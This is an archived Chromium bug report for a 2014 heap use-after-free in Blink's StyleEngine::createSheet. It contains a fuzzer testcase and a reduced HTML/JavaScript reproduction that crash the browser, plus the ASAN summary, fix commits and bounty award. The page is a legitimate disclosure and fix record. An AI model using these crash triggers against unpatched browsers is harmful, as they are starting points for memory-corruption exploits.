# Security: Use after free in StyleEngine::createSheet

| Field | Value |
|-------|-------|
| **Issue ID** | [40079199](https://issues.chromium.org/issues/40079199) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>CSS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2014-03-26 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The testcase below crashes the latest ASAN chrome build

**REPRODUCTION CASE**

<script>
function start() {
o0=document.createElement('iframe');
o1=document.createElement('iframe');
document.body.appendChild(o1);
o4=document.createElement('iframe');
document.body.appendChild(o4);
o6=document.documentElement;
o48=document.createElement('style');
o48.innerHTML = 'blockquote tr td { shape-rendering: auto; }';
o136=window.getSelection();
o136.selectAllChildren(o6);
o137=o136.getRangeAt(0);
o163=document.body;
o54=o4.contentWindow.document;
o0.src='javascript:window.top.cb\_scriptsrc\_48\_1();';
o70=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o6.appendChild(o70);
o79=o54.createRange();
o79.selectNodeContents(o4);
o108=document;
o124=o70.contentWindow.document;
o294=o1.contentWindow.document;
o108.open();
o0.appendChild(o6);
o6.appendChild(o48);
o6.appendChild(o163);
o327=o294.createElement('object');
o79.surroundContents(o327);
o327.appendChild(o0);
}
function cb\_scriptsrc\_48\_1() {
o48.nextSibling.appendChild(o48.firstChild);
o79.deleteContents();
o124.documentElement.appendChild(o0);
o137.insertNode(o6);
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: ASAN output attached in debug.txt

## Attachments

- [debug.txt](attachments/debug.txt) (text/plain, 12.2 KB)

## Timeline

### cl...@chromium.org (2014-03-26)

ClusterFuzz is analyzing your testcase. See https://cluster-fuzz.appspot.com/testcase?key=6007103558778880.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-03-26)

[Empty comment from Monorail migration]

### jw...@chromium.org (2014-03-26)

morrita@, it appears that this is a CSS Blink UAF. Can you take a look or assign to someone else? Thanks!

### cl...@chromium.org (2014-03-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-26)

This medium+ severity security issue is a regression on trunk.

Please fix this asap. If you are unable to look into this soon, please revert your change.

- Your friendly ClusterFuzz

### [Deleted User] (2014-03-26)

let me see.

### cl...@chromium.org (2014-03-26)

This medium+ severity security issue is a regression on trunk.

Please fix this asap. If you are unable to look into this soon, please revert your change.

- Your friendly ClusterFuzz

### [Deleted User] (2014-03-28)

Reduction:
----
<body>
<script>
function callback() {
    style0.removeChild(style0.firstChild);
    iframe0.removeChild(style0);
}

style0=document.createElement('style');
style0.innerHTML = 'span { color: blue; }';

iframe0=document.createElement('iframe');
iframe0.appendChild(style0);

iframe0.src='javascript:window.top.callback();';
document.body.appendChild(iframe0);
</script>
</body>


### cl...@chromium.org (2014-03-31)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-31)

[Empty comment from Monorail migration]

### [Deleted User] (2014-04-02)

[Empty comment from Monorail migration]

### [Deleted User] (2014-04-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2014-04-02)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=170702

------------------------------------------------------------------
r170702 | morrita@chromium.org | 2014-04-02T21:00:10.534627Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/frames/javascript-url-style-crash-expected.txt?r1=170702&r2=170701&pathrev=170702
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/frames/javascript-url-style-crash.html?r1=170702&r2=170701&pathrev=170702
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/HTMLScriptElement/append-child-style-crash-expected.txt?r1=170702&r2=170701&pathrev=170702
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/StyleElement.cpp?r1=170702&r2=170701&pathrev=170702
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/HTMLScriptElement/append-child-style-crash.html?r1=170702&r2=170701&pathrev=170702

Make StyleElement robust against tree mutation

It is possible that HTMLStyleElement::removedFrom() is called
before HTMLStyleElement::didNotifySubtreeInsertionsToDocument().

BUG=356653
TEST=append-child-style-crash.html,javascript-url-style-crash.html
R=esprehn@chromium.org, abath@chromium.org

Review URL: https://codereview.chromium.org/221673003
-----------------------------------------------------------------

### in...@chromium.org (2014-04-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2014-04-02)

Is there a merge required here?

### cl...@chromium.org (2014-04-02)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-04-03)

ClusterFuzz has detected this issue as fixed in range 259494:259530.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6007103558778880

Uploader: clusterfuzz@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x6130000434c4
Crash State:
  - crash stack -
  WebCore::StyleEngine::createSheet
  WebCore::StyleElement::createSheet
  - free stack -
  WebCore::CSSStyleSheet::~CSSStyleSheet
  WebCore::CSSStyleSheet::~CSSStyleSheet
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=258508:258595
Fixed: https://cluster-fuzz.appspot.com/revisions?range=259494:259530

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94rVxfAoSZuRFd-LvpIY0zJ7Hm4dwLN2cxXuzuY4H6dW9Gc8XAxAe9FbEPjwsQsAOo6qIyAyCXHVHBEJHT2RM1924SkP1HFsFd171_FHhSe7YVo6XnPyuYUiDR0qVB9saHizVu9lZciPq-l8r5SARXD_lopkw

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### ti...@chromium.org (2014-04-04)

[Empty comment from Monorail migration]

### ka...@google.com (2014-04-15)

is this on m35? do we need a merge?

### cl...@chromium.org (2014-04-15)

morrita@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### [Deleted User] (2014-04-15)

Fix was landed:
https://codereview.chromium.org/221673003
https://src.chromium.org/viewvc/blink?revision=170702&view=revision

For some reason bot didn't told it to us.


### ka...@google.com (2014-04-21)

morrita-san pls merge to M35.

### ti...@chromium.org (2014-04-21)

[Empty comment from Monorail migration]

### [Deleted User] (2014-04-21)

https://codereview.chromium.org/244643007

### bu...@chromium.org (2014-04-21)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=172052

------------------------------------------------------------------
r172052 | morrita@chromium.org | 2014-04-21T17:57:06.905369Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/1916/LayoutTests/fast/frames/javascript-url-style-crash.html?r1=172052&r2=172051&pathrev=172052
   A http://src.chromium.org/viewvc/blink/branches/chromium/1916/LayoutTests/fast/dom/HTMLScriptElement/append-child-style-crash-expected.txt?r1=172052&r2=172051&pathrev=172052
   M http://src.chromium.org/viewvc/blink/branches/chromium/1916/Source/core/dom/StyleElement.cpp?r1=172052&r2=172051&pathrev=172052
   A http://src.chromium.org/viewvc/blink/branches/chromium/1916/LayoutTests/fast/dom/HTMLScriptElement/append-child-style-crash.html?r1=172052&r2=172051&pathrev=172052
   A http://src.chromium.org/viewvc/blink/branches/chromium/1916/LayoutTests/fast/frames/javascript-url-style-crash-expected.txt?r1=172052&r2=172051&pathrev=172052

Merge 170702 "Make StyleElement robust against tree mutation"

> Make StyleElement robust against tree mutation
> 
> It is possible that HTMLStyleElement::removedFrom() is called
> before HTMLStyleElement::didNotifySubtreeInsertionsToDocument().
> 
> BUG=356653
> TEST=append-child-style-crash.html,javascript-url-style-crash.html
> R=esprehn@chromium.org, abath@chromium.org
> 
> Review URL: https://codereview.chromium.org/221673003

TBR=morrita@chromium.org,kareng@chromium.org

Review URL: https://codereview.chromium.org/244643007
-----------------------------------------------------------------

### ti...@chromium.org (2014-04-22)

[Empty comment from Monorail migration]

### ka...@google.com (2014-05-05)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-05-12)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-05-16)

This bug is a regression and does not impact stable. Removing incorrectly added Release-0-M35 label.

- Your friendly ClusterFuzz

### ti...@chromium.org (2014-05-19)

Congratulations - $3000 for this report.

### ti...@chromium.org (2014-07-22)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-22)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/356653?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocking: crbug.com/chromium/359148]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40079199)*
